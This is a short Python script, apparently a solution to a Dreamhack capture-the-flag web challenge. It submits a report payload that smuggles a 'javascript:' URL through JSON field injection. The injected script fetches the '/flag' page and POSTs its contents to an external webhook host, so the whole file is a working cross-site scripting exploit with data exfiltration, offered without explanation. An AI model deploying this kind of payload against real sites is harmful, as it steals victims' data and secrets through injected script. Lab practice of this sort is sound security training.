import requests
from urllib.parse import quote

url = 'http://host3.dreamhack.games:8621'
s = requests.Session()

webhook = 'https://pkwojyd.request.dreamhack.games'

js = """
async function f(){
r = await fetch('/flag');
d = await r.text();
fetch('%s', {method:'POST', body: JSON.stringify({'e': d})});
};

f()
""".replace('\n', '') % webhook

payload = '", "username": "hello", "setblog": "javascript://web-noob.kr/%%0a%s", "a":"' % js

res = s.post(f'{url}/report', data={
    'pay': quote(payload)
})

assert "good report" in res.text.lower()
print("> Reported payload")